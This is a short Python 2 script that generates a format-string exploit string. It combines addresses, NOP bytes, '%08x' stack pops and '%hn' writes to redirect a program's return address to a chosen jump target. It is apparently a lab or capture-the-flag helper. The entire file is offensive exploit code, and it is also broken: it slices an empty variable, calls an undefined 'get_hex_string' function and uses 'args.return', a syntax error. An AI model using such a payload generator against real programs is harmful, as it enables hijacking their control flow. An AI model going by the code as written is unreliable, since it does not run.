#!/usr/bin/python

import sys, getopt
from argparse import ArgumentParser, ArgumentTypeError

def integer(s):
    try:
        d=int(s, 0)
    except Exception as e:
        raise ArgumentTypeError("Invalid based character '{}'".format(s))
    return d

def main():
    ret_addr = ''
    jump_addr = ''
    pop_count = 4

    '''
    try:
        opts, args = getopt.getopt(argv,"hj:r:p:",["jmp=","ret=", "popcount="])
    except getopt.GetoptError:
        print 'Usage: -j <address to jump to> -r <location of return address> [-p number of times to pop off stack]'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print 'Usage: -j <address to jump to> -r <location of return address> [-p number of times to pop off stack] '
            sys.exit()
        elif opt in ("-j", "--jmp"):
            jump_addr = hex(int(arg,16))[2:]
        elif opt in ("-r", "--ret"):
            ret_addr = arg
        elif opt in ("-p", "--pop"):
            pop_count = int(arg)
            '''

    parser = ArgumentParser()
    parser.add_argument("-j", "--jump", type=integer)
    parser.add_argument("-r", "--return", type=integer)
    parser.add_argument("-p", "--pop", type=integer)
    args = parser.parse_args()

    offset1 = int(jump_addr[4:],16) - 44
    offset2 = int(jump_addr[:4], 16) - 44 - offset1
    print get_hex_string(hex(args.jump)[2:]) + '\x90\x90\x90\x90' + get_hex_string(hex(args.return+ 2)[2:]) + '%08x' * args.pop + '%' + str(offset1) + 'x' + '%hn' + '%' + str(offset2) + 'x' + '%hn'



if __name__ == "__main__":
    main()
